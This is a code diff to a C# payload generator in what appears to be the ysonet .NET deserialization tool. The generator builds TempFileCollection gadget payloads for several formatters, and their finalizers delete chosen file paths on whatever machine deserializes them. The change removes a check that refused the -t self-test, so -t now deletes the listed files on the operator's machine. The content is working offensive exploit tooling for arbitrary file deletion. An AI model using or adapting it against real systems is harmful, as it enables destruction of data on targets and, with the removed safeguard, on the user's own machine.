@@ -33,13 +33,15 @@ namespace ysonet.Generators
      * File.Delete failure is swallowed by the framework's own try/catch, so a missing file, a
      * locked file, or a permission error produces no error anywhere.
      *
-     * LOCAL SAFETY. The generator NEVER constructs a real TempFileCollection: a live instance
-     * would arm that finalizer inside ysonet.exe and could delete the operator's own files
-     * once it went out of scope. Two inert stand-ins carry the type instead - an ISerializable
-     * marshal with SerializationInfo.SetType for the runtime formatters, and a [DataContract]
-     * shape for the two DataContract ones - so nothing on this machine is ever finalizable. For
-     * the same reason -t is REFUSED rather than ignored: self-testing means deserializing,
-     * and deserializing this payload here creates exactly the object we are avoiding.
+     * GENERATION IS INERT; -t IS A SELF-EXPLOIT. The generator NEVER constructs a real
+     * TempFileCollection while BUILDING the payload: two inert stand-ins carry the type
+     * instead - an ISerializable marshal with SerializationInfo.SetType for the runtime
+     * formatters, and a [DataContract] shape for the two DataContract ones - so a plain
+     * generation is finalizer-free. -t is different and is ACCEPTED: it deserializes the
+     * payload HERE, which creates the real TempFileCollection and lets its finalizer delete
+     * the operator's own files. In ysonet -t means "run the exploit on myself", so that is
+     * the intended behavior, but it is genuinely DESTRUCTIVE - it deletes exactly the paths
+     * in -c/--extrafile - so the option help warns to -t only paths you are willing to lose.
      *
      * The framework type carries a FullTrust LinkDemand. That matters for a partially trusted
      * caller, not for the fully trusted deserialization this targets, so it is recorded as a
@@ -98,13 +100,13 @@ namespace ysonet.Generators
 
         // Two short sentences: this is the FIRST block of the interactive info panel and a
         // long one pushes the formatter, command-input and category lines off the screen. The
-        // timing, the swallowed errors and the -t refusal are spelled out in the option help,
-        // which --fullhelp and the editor both show.
+        // timing, the swallowed errors and the destructive -t are spelled out in the option
+        // help, which --fullhelp and the editor both show.
         public override string AdditionalInfo()
         {
             return "System.CodeDom.Compiler.TempFileCollection deletes the supplied target paths "
-                + "when the deserialized object is disposed or finalized. The timing is the "
-                + "target's and the framework swallows every delete error, so -t is refused.";
+                + "when the deserialized object is disposed or finalized. -t self-tests here, so "
+                + "it DELETES those paths on THIS machine.";
         }
 
         public override List<string> Labels()
@@ -185,25 +187,45 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            // FIRST, before anything that could serialize or deserialize. -t deserializes the
-            // payload in this process, which would create a real TempFileCollection holding
-            // the operator's paths and hand it to the finalizer queue inside ysonet.exe.
-            // Refusing loudly (the exit code carries it) beats ignoring the flag, which would
-            // imply that a self-test had validated something. Everything below can therefore
-            // assume inputArgs.Test is false.
-            RefuseSelfTest(inputArgs);
-
+            // -t deserializes the payload in THIS process, which creates a real
+            // TempFileCollection holding the operator's paths; its finalizer then deletes
+            // those files on the operator's own machine. That is a SELF-EXPLOIT, which is
+            // what -t is for in ysonet - so it is ACCEPTED (the maintainer's call). It is
+            // genuinely destructive: -t DELETES exactly the paths in -c/--extrafile, so only
+            // -t paths you are willing to lose. The option help says so, and the self-test
+            // below (Serialize / the hand-written path) performs the deserialize when -t is
+            // set; the deletion happens when the finalizer runs.
             List<string> paths = CollectPaths(inputArgs);
             Hashtable files = BuildFilesTable(paths);
             bool minify = inputArgs != null && inputArgs.Minify;
 
+            // Build and CHECK with the self-test OFF first, so a path --minify rewrote is
+            // refused (RequirePathsArriveIntact, inside each builder) BEFORE -t can delete the
+            // wrong file. This gadget's -t effect is deletion, so the order matters: without
+            // this a Soap+--minify+-t run would delete the corrupted path and only then refuse.
+            InputArgs probeArgs = inputArgs == null ? null : inputArgs.DeepCopy();
+            if (probeArgs != null) probeArgs.Test = false;
+            object probe = BuildTempFilePayload(formatter, files, paths, probeArgs, minify);
+
+            if (inputArgs == null || !inputArgs.Test)
+                return probe;
+
+            // -t was asked for: rebuild with the self-test on. That deserializes the payload
+            // HERE and, for BF/Soap/Los, creates the real TempFileCollection whose finalizer
+            // deletes the paths on this machine (a self-exploit). The path is already proved
+            // to survive above, so the self-test never operates on a rewritten one.
+            return BuildTempFilePayload(formatter, files, paths, inputArgs, minify);
+        }
+
+        // The per-formatter payload build, shared by the Test=false probe and the -t rebuild.
+        private object BuildTempFilePayload(string formatter, Hashtable files, List<string> paths,
+            InputArgs inputArgs, bool minify)
+        {
             if (formatter.Equals(Formatters.NetDataContractSerializer, StringComparison.OrdinalIgnoreCase))
                 return BuildNetDataContractPayload(files, paths, inputArgs, minify);
             if (formatter.Equals(Formatters.DataContractSerializer, StringComparison.OrdinalIgnoreCase))
                 return BuildDataContractPayload(files, paths, inputArgs, minify);
 
-            // -t is refused above, so Serialize has no side effect here and the payload can be
-            // built once, checked, and returned. No probe serialization is needed.
             object serialized = Serialize(new TempFileCollectionMarshal(files), formatter, inputArgs);
             RequirePathsArriveIntact(serialized, formatter, paths, minify);
             return serialized;
@@ -346,17 +368,6 @@ namespace ysonet.Generators
         }
 
         // ---- Local safety ------------------------------------------------------
-
-        private void RefuseSelfTest(InputArgs inputArgs)
-        {
-            if (inputArgs == null || !inputArgs.Test)
-                return;
-
-            throw new ArgumentException(Name() + " refuses -t. A self-test deserializes the "
-                + "payload in THIS process, which would create a real TempFileCollection "
-                + "holding your paths and let its finalizer delete YOUR files. Generate "
-                + "without -t and deliver the payload to the target instead.");
-        }
 
         // ---- Input handling ----------------------------------------------------
 
